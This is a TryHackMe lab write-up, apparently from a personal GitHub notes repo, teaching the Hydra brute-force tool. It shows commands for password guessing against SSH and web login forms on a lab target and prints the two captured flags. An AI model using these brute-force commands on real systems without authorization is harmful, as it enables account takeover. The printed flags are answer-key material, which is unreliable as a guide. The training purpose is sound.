# 🔱 Hydra — TryHackMe Room Writeup

> **Path:** [Cyber Security 101](https://tryhackme.com/paths) → [Offensive Security Tooling](https://tryhackme.com/module/offensive-security-tooling) → Hydra  
> **Difficulty:** Easy  
> **Status:** ✅ Completed  
> **Flags Captured:** 2/2 🚩

---

## 📌 Table of Contents

- [🔱 What is Hydra?](#-what-is-hydra)
- [⚙️ How It Works](#️-how-it-works)
- [🎯 Attack Types](#-attack-types)
- [📋 Command Syntax](#-command-syntax)
- [🚩 Task 1 — Web Form Brute Force (Flag 1)](#-task-1--web-form-brute-force-flag-1)
- [🚩 Task 2 — SSH Brute Force (Flag 2)](#-task-2--ssh-brute-force-flag-2)
- [📖 Key Takeaways](#-key-takeaways)

---

## 🔱 What is Hydra?

**Hydra** is an automated **password brute-force tool** used in penetration testing. Instead of manually guessing passwords one by one, Hydra does it automatically at high speed.

> 🧠 **Real-life analogy:** Imagine you have a lock and 1,000 keys — Hydra is the person who tries every single key, one by one, automatically, without getting tired! 🔑

Manually guessing passwords is practically **impossible** when a wordlist contains millions of entries — that's exactly why we use Hydra.

---

## ⚙️ How It Works

```
You provide:
  ├── Target IP / URL    →  Where to attack (SSH, FTP, website)
  ├── Username           →  e.g., molly
  └── Wordlist           →  rockyou.txt (millions of passwords)

Hydra does:
  molly:password123   ❌
  molly:letmein       ❌
  molly:sunshine      ✅  LOGIN FOUND!
```

---

## 🎯 Attack Types

| Service | Use Case | Protocol Flag |
|---------|----------|---------------|
| 🖥️ SSH | Remote server login | `ssh` |
| 📁 FTP | File transfer login | `ftp` |
| 🪟 RDP | Windows remote login | `rdp` |
| 🌐 HTTP Forms | Website login pages | `http-post-form` |
| 🗄️ MySQL | Database login | `mysql` |

---

## 📋 Command Syntax

### 🔐 SSH Brute Force

```bash
hydra -l <username> -P <wordlist> <target_ip> -t 4 ssh
```

| Flag | Description |
|------|-------------|
| `-l username` | Specify a single username |
| `-P wordlist.txt` | Path to the password list |
| `<target_ip>` | IP address of the target machine |
| `-t 4` | 4 parallel threads (controls speed) |
| `ssh` | Protocol being attacked |

---

### 🌐 HTTP Web Form Brute Force (POST)

```bash
hydra -l <username> -P <wordlist> <target_ip> \
  http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

| Part | Description |
|------|-------------|
| `http-post-form` | Attack a web login form |
| `/` | Login page path (e.g. `/login.php`) |
| `^USER^` | Placeholder — replaced with username |
| `^PASS^` | Placeholder — replaced with each password |
| `F=incorrect` | Fail condition — response contains "incorrect" |
| `-V` | Verbose — print every attempt |

---

### 🔌 Non-Default Port Attack

```bash
hydra -l admin -P wordlist.txt <target_ip> \
  http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -s 8080 -V
```

> `-s 8080` → Specify a custom port

---

## 🚩 Task 1 — Web Form Brute Force (Flag 1)

**Objective:** Brute-force Molly's web login password

**Command Used:**
```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.112.162.205 \
  http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```

**Result:** ✅ Password found → Web login successful!

### 🖼️ Proof Screenshot

https://github.com/alimirza2412/Tryhackme-notes/blob/87b1e8edc70f4024c7f14a1692de8d7c29da19ae/Cyber-Security-101/Offensive-Security-Tooling/Hydra/flag%201.png

> 🏁 **Flag 1:** `THM{2673a7dd116de68e85c48ec0b1f2612e}`

---

## 🚩 Task 2 — SSH Brute Force (Flag 2)

**Objective:** Brute-force Molly's SSH password and read flag2.txt

**Command Used:**
```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.112.162.205 -t 4 ssh
```

**After gaining access:**
```bash
ssh molly@10.112.162.205
ls
cat flag2.txt
```

**Result:** ✅ SSH access gained → flag2.txt read successfully!

### 🖼️ Proof Screenshot

![Flag 2 - SSH](./flag_2.png)

> 🏁 **Flag 2:** `THM{c8eeb0468febbadea859baeb33b2541b}`

---

## 📖 Key Takeaways

```
✅ Hydra = Automated password brute-force tool
✅ rockyou.txt = Most common wordlist used in CTFs
✅ SSH attack   → hydra ... ssh
✅ Web attack   → hydra ... http-post-form "..."
✅ ^USER^ and ^PASS^ = placeholders in the web form string
✅ F=incorrect  = identifies a failed login from the response
✅ -t = threads (speed control), -V = verbose mode (debug)
```

> ⚠️ **Disclaimer:** Always have explicit authorization before running Hydra against any system. Unauthorized use is illegal! 🚫

---

*Writeup by: Muhammad Ali | TryHackMe: Muhammad.Ali12*  
*GitHub: [alimirza2412/Tryhackme-notes](https://github.com/alimirza2412/Tryhackme-notes)*
